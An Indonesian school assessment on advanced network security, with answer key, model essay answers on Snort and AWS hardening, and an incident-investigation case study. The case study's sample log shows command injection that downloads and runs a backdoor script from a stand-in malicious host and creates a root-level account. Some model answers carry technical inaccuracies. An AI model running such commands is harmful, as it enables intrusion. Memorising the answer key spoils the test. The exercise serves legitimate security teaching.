# 📝 Asesmen: Keamanan Jaringan Lanjutan

## 🎯 Kompetensi Dasar
3.21 Menerapkan sistem deteksi dan pencegahan intrusi
3.22 Mengkonfigurasi keamanan jaringan virtual
3.23 Menganalisis keamanan infrastruktur cloud
3.24 Melakukan manajemen insiden keamanan jaringan

## 📝 Soal Pilihan Ganda

### 1. Manakah yang BUKAN merupakan komponen utama dari arsitektur Zero Trust?
   a) Micro-segmentation  
   b) Least privilege access  
   c) Implicit trust  
   d) Multi-factor authentication  
   
   **Jawaban: c) Implicit trust**  
   *Pembahasan: Arsitektur Zero Trust justru menghilangkan konsep implicit trust dan menggantinya dengan verifikasi berkelanjutan (continuous verification).*

### 2. Manakah protokol yang PALING AMAN untuk mengimplementasikan VPN?
   a) PPTP  
   b) L2TP/IPsec  
   c) OpenVPN dengan TLS  
   d) IKEv2/IPsec  
   
   **Jawaban: c) OpenVPN dengan TLS**  
   *Pembahasan: OpenVPN dengan TLS menawarkan enkripsi yang kuat (AES-256) dan fleksibilitas konfigurasi yang tinggi, sementara PPTP sudah tidak aman, dan L2TP/IPsec memiliki beberapa kerentanan yang diketahui.*

### 3. Manakah yang BUKAN merupakan fase dalam siklus hidup manajemen insiden keamanan?
   a) Persiapan  
   b) Identifikasi  
   c) Pemulihan  
   d) Pelaporan ke publik  
   
   **Jawaban: d) Pelaporan ke publik**  
   *Pembahasan: Meskipun komunikasi penting, pelaporan ke publik bukanlah fase wajib dalam siklus hidup manajemen insiden. Fase utamanya adalah Persiapan, Identifikasi, Kontainmen, Pemberantasan, Pemulihan, dan Pelajaran yang Dipetik.*

## 📝 Soal Esai

### 1. Jelaskan perbedaan antara IDS (Intrusion Detection System) dan IPS (Intrusion Prevention System), serta berikan contoh implementasi dan konfigurasi dasar untuk masing-masing sistem!

**Jawaban:**

**Perbedaan Utama IDS dan IPS:**

| Aspek | IDS | IPS |
|-------|-----|-----|
| **Posisi Jaringan** | Out-of-band (menganalisis salinan traffic) | Inline (berada di jalur traffic) |
| **Tindakan** | Hanya mendeteksi dan memberi peringatan | Dapat memblokir/mencegah serangan |
| **Dampak Performa** | Minimal (karena tidak di jalur utama) | Dapat mempengaruhi latensi jaringan |
| **Contoh Tools** | Snort (mode IDS), Suricata | Snort (mode IPS), Suricata IPS |

**Contoh Implementasi Snort sebagai IDS:**

```bash
# 1. Instalasi Snort
sudo apt update
sudo apt install -y snort

# 2. Konfigurasi dasar (/etc/snort/snort.conf)
ipvar HOME_NET 192.168.1.0/24
ipvar EXTERNAL_NET !$HOME_NET
var RULE_PATH /etc/snort/rules

# 3. Jalankan Snort dalam mode IDS
sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i eth0
```

**Contoh Implementasi Snort sebagai IPS:**

```bash
# 1. Aktifkan mode inline di snort.conf
config policy_mode:inline

# 2. Tambahkan aturan pencegahan
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 \
(msg:"ET SCAN SSH Version Scan"; \
flow:to_server,established; \
detection_filter:track by_src, count 3, seconds 60; \
sid:1000001; rev:1;)

# 3. Konfigurasi iptables untuk mengarahkan traffic
sudo iptables -A FORWARD -j NFQUEUE --queue-num 0

# 4. Jalankan Snort dalam mode IPS
sudo snort -Q -c /etc/snort/snort.conf -i eth0
```

**Keuntungan dan Kerugian:**
- **IDS**: Lebih ringan, tidak mempengaruhi traffic, tetapi hanya memberikan peringatan
- **IPS**: Dapat mencegah serangan secara real-time, tetapi memerlukan sumber daya lebih besar dan konfigurasi yang hati-hati untuk menghindari false positive yang mengganggu lalu lintas sah

### 2. Sebuah perusahaan memiliki infrastruktur hybrid cloud dengan server di lokal dan AWS. Jelaskan langkah-langkah komprehensif untuk mengamankan infrastruktur tersebut, termasuk tools dan konfigurasi yang direkomendasikan!

**Jawaban:**

**1. Keamanan Jaringan**

**a. Segmentasi Jaringan**
```bash
# AWS VPC Configuration
aws ec2 create-vpc --cidr-block 10.0.0.0/16
aws ec2 create-subnet --vpc-id vpc-1234 --cidr-block 10.0.1.0/24

# Security Groups (Firewall)
aws ec2 create-security-group --group-name WebDMZ --description "Web DMZ" --vpc-id vpc-1234
aws ec2 authorize-security-group-ingress --group-id sg-1234 --protocol tcp --port 80 --cidr 0.0.0.0/0
```

**b. Koneksi Aman Antar Cloud**
- Gunakan AWS Direct Connect atau VPN Site-to-Site
- Implementasi Transit Gateway untuk konektivitas antar VPC

**2. Manajemen Identitas dan Akses**

**a. AWS IAM**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": ["arn:aws:s3:::secure-bucket/*"],
      "Condition": {
        "IpAddress": {"aws:SourceIp": ["203.0.113.0/24"]},
        "Bool": {"aws:MultiFactorAuthPresent": "true"}
      }
    }
  ]
}
```

**b. Federasi Identitas**
- Integrasi dengan Active Directory menggunakan AWS Directory Service
- Implementasi Single Sign-On (SSO)

**3. Enkripsi Data**

**a. Data in Transit**
```bash
# Enforce TLS 1.2+ on AWS ELB
aws elb create-load-balancer-policy --load-balancer-name my-load-balancer \
  --policy-name my-ssl-policy \
  --policy-type-name SSLNegotiationPolicyType \
  --policy-attributes "AttributeName=Protocol-TLSv1.2,AttributeValue=true"
```

**b. Data at Rest**
- Enkripsi EBS volume dengan AWS KMS
- Enkripsi S3 dengan SSE-KMS

**4. Monitoring dan Logging**

**a. AWS CloudTrail & CloudWatch**
```bash
# Aktifkan CloudTrail
aws cloudtrail create-trail --name security-trail \
  --s3-bucket my-cloudtrail-logs \
  --is-multi-region-trail

# Buat metric filter untuk aktivitas mencurigakan
aws logs put-metric-filter \
  --log-group-name "CloudTrail/DefaultLogGroup" \
  --filter-name "UnauthorizedAPICalls" \
  --filter-pattern '{ ($.errorCode = "*UnauthorizedOperation") || ($.errorCode = "AccessDenied*") }' \
  --metric-transformations metricName=UnauthorizedAPICalls,metricNamespace=SecurityMetrics,metricValue=1
```

**b. SIEM Terintegrasi**
- Gunakan AWS Security Hub dengan Amazon GuardDuty
- Integrasi dengan tool SIEM pihak ketiga seperti Splunk atau ELK Stack

**5. Keamanan Aplikasi**

**a. WAF (Web Application Firewall)**
```bash
# Buat Web ACL
aws wafv2 create-web-acl \
  --name WebACL-1 \
  --scope REGIONAL \
  --default-action "Block={}" \
  --rules file://waf-rules.json \
  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=WebACLMetric
```

**b. API Gateway Security**
- Implementasi rate limiting
- Validasi input dan output
- Gunakan API Gateway dengan WAF

**6. Otomatisasi Keamanan**

**a. Infrastructure as Code**
```hcl
# Contoh Terraform untuk konfigurasi keamanan
resource "aws_security_group" "web" {
  name        = "web-sg"
  description = "Security group for web servers"
  
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

**b. Patching Otomatis**
- Gunakan AWS Systems Manager Patch Manager
- Jadwalkan pemeliharaan secara teratur

**7. Rencana Respons Insiden**

**a. Runbook Otomatis**
```python
import boto3

def isolate_instance(instance_id):
    ec2 = boto3.client('ec2')
    
    # Ambil security group default
    default_sg = ''
    response = ec2.describe_security_groups(Filters=[
        {'Name': 'group-name', 'Values': ['default']}
    ])
    if response['SecurityGroups']:
        default_sg = response['SecurityGroups'][0]['GroupId']
    
    # Ganti security group dengan default (tanpa akses)
    ec2.modify_instance_attribute(
        InstanceId=instance_id,
        Groups=[default_sg]
    )
    
    # Ambil snapshot volume
    volumes = ec2.describe_volumes(Filters=[
        {'Name': 'attachment.instance-id', 'Values': [instance_id]}
    ])
    
    for vol in volumes['Volumes']:
        ec2.create_snapshot(
            VolumeId=vol['VolumeId'],
            Description=f'Forensic snapshot for incident response - {instance_id}'
        )
```

**b. Pelatihan dan Simulasi**
- Latihan tabletop secara berkala
- Simulasi insiden keamanan

## 📝 Studi Kasus: Investigasi Insiden Keamanan

**Latar Belakang:**
Anda adalah bagian dari tim SOC (Security Operations Center) di sebuah perusahaan finansial. Sistem monitoring mendeteksi aktivitas mencurigakan dari server internal (192.168.1.100) ke beberapa alamat IP eksternal. Server tersebut adalah bagian dari lingkungan development yang menjalankan aplikasi web berbasis PHP.

**Log yang Tersedia:**
1. Log akses web server (Apache)
2. Log sistem (auth.log, syslog)
3. Output dari perintah `netstat -tulnp`
4. Alert dari Snort IDS

**Pertanyaan:**
1. Analisis indikator kompromi (IoC) dari log yang tersedia!
2. Jelaskan langkah-langkah untuk mengisolasi server yang terkompromi!
3. Bagaimana cara mengamankan server untuk mencegah kejadian serupa di masa depan?
4. Buat laporan insiden untuk manajemen!

**Jawaban Contoh:**

### 1. Analisis Indikator Kompromi (IoC)

**a. Log Web Server**
```
192.168.1.100 - - [15/Jan/2025:14:32:11 +0700] "GET /admin/scripts/setup.php?cmd=id HTTP/1.1" 200 3124
192.168.1.100 - - [15/Jan/2025:14:32:15 +0700] "GET /admin/scripts/setup.php?cmd=wget%20http://malicious.site/backdoor.sh HTTP/1.1" 200 4123
192.168.1.100 - - [15/Jan/2025:14:32:20 +0700] "GET /admin/scripts/setup.php?cmd=chmod%20%2bx%20backdoor.sh HTTP/1.1" 200 2987
192.168.1.100 - - [15/Jan/2025:14:32:25 +0700] "GET /admin/scripts/setup.php?cmd=.%2Fbackdoor.sh HTTP/1.1" 200 5123
```

**Indikator:**
- Eksploitasi file setup.php yang tidak dihapus
- Download dan eksekusi script dari sumber eksternal
- Command injection melalui parameter `cmd`

**b. Log Sistem**
```
Jan 15 14:32:30 dev-server sudo:     admin : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash
Jan 15 14:33:00 dev-server useradd: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash
Jan 15 14:33:05 dev-server sshd[1234]: Accepted password for backdoor from 198.51.100.1 port 54321
```

**Indikator:**
- Eskalasi hak akses ke root
- Pembuatan akun backdoor
- Login SSH dari IP eksternal

### 2. Langkah Isolasi

**a. Isolasi Jaringan**
```bash
# Blokir akses keluar dari server yang terinfeksi
iptables -A OUTPUT -s 192.168.1.100 -j DROP

# Blokir akses ke server dari jaringan eksternal
iptables -A INPUT -s 198.51.100.1 -j DROP

# Nonaktifkan akun backdoor
usermod -L backdoor
passwd -l backdoor
```

**b. Preservasi Bukti**
```bash
# Ambil hash semua file yang dimodifikasi
find / -type f -newermt "2025-01-15 14:30:00" ! -path "/proc/*" ! -path "/sys/*" -exec md5sum {} \; > /root/forensic_hashes.txt

# Dump memori untuk analisis lebih lanjut
dd if=/dev/mem of=/root/memory_dump.dd bs=1M

# Ambil log penting
cp -r /var/log /root/log_backup
```

### 3. Pencegahan di Masa Depan

**a. Hardening Sistem**
```bash
# Hapus file setup yang tidak perlu
rm -f /var/www/html/admin/scripts/setup.php

# Update dan patch sistem
apt update && apt upgrade -y

# Install dan konfigurasi fail2ban
apt install -y fail2ban
cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# Aktifkan mod_security
a2enmod security2
systemctl restart apache2
```

**b. Monitoring yang Lebih Baik**
```bash
# Install dan konfigurasi OSSEC
apt install -y ossec-hids-server

# Tambahkan aturan kustom untuk mendeteksi aktivitas mencurigakan
cat > /var/ossec/rules/local_rules.xml <<EOL
<group name="local,syslog,">
  <rule id="100001" level="10">
    <if_sid>31151</if_sid>
    <match>ossec: output: 'netstat -tan | grep ESTABLISHED'</match>
    <description>New network connection detected</description>
  </rule>
</group>
EOL

systemctl restart ossec
```

### 4. Laporan Insiden (Contoh Ringkasan)

**Ringkasan Eksekutif:**
- **Waktu Kejadian**: 15 Januari 2025, 14:32 WIB
- **Sistem Terdampak**: Server Development (192.168.1.100)
- **Jenis Serangan**: Web Shell Upload via Vulnerable PHP Script
- **Tingkat Keparahan**: Tinggi
- **Status**: Berhasil diisolasi, investigasi berlangsung

**Rekomendasi:**
1. Lakukan audit keamanan menyeluruh terhadap semua server
2. Implementasikan WAF untuk melindungi aplikasi web
3. Perkuat kebijakan akses dan autentikasi
4. Tingkatkan pelatihan kesadaran keamanan untuk tim pengembang

## 📝 Tugas Praktik: Implementasi Zero Trust Architecture

### Instruksi:
1. Rancang arsitektur Zero Trust untuk perusahaan dengan 3 departemen (IT, Keuangan, HR)
2. Implementasikan segmentasi jaringan mikro menggunakan teknologi pilihan
3. Buat dokumentasi teknis dan panduan pengguna

### Format Laporan:

1. **Arsitektur Jaringan**
   - Diagram jaringan
   - Deskripsi komponen
   - Alur lalu lintas jaringan

2. **Implementasi Teknis**
   ```
   ### 1. Segmentasi Jaringan
   - VLAN Configuration
   - Firewall Rules
   - Access Control Lists
   
   ### 2. Autentikasi dan Otorisasi
   - Multi-Factor Authentication
   - Role-Based Access Control
   - Policy Enforcement Points
   
   ### 3. Monitoring dan Logging
   - SIEM Configuration
   - Alerting Mechanism
   - Audit Trails
   ```

3. **Pengujian Keamanan**
   - Skenario pengujian
   - Hasil pengujian
   - Remediasi yang dilakukan

4. **Dokumentasi**
   - Panduan pengguna
   - Prosedur darurat
   - Kontak penting

### Rubrik Penilaian Praktik:
| Kriteria | Skor | Deskripsi |
|----------|------|-----------|
| Kelengkapan Arsitektur | 25% | Semua komponen penting tercakup |
| Implementasi Teknis | 30% | Kesesuaian dengan prinsip Zero Trust |
| Keamanan | 25% | Kekuatan kontrol keamanan yang diimplementasikan |
| Dokumentasi | 20% | Kejelasan dan kelengkapan dokumentasi |

## 📊 Kunci Jawaban dan Pembahasan

### Kunci Pilihan Ganda
1. c) Implicit trust
2. c) OpenVPN dengan TLS
3. d) Pelaporan ke publik

### Pedoman Penskoran Esai
1. **Kedalaman Analisis** (30%): Pemahaman mendalam tentang topik
2. **Relevansi Solusi** (25%): Kesesuaian solusi dengan masalah
3. **Implementasi Teknis** (25%): Detail dan kelayakan implementasi
4. **Struktur dan Kejelasan** (20%): Penyampaian yang terorganisir dan mudah dipahami

## 📚 Referensi
1. NIST Zero Trust Architecture: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf
2. CIS AWS Foundations Benchmark
3. MITRE ATT&CK Framework
4. Cloud Security Alliance (CSA) Guidance

---
<div align="center">
  <p>Dokumen Asesmen - Keamanan Jaringan Lanjutan</p>
  <p>© 2025 SMKN 1 Punggelan - Program Keahlian Teknik Komputer dan Jaringan</p>
</div>
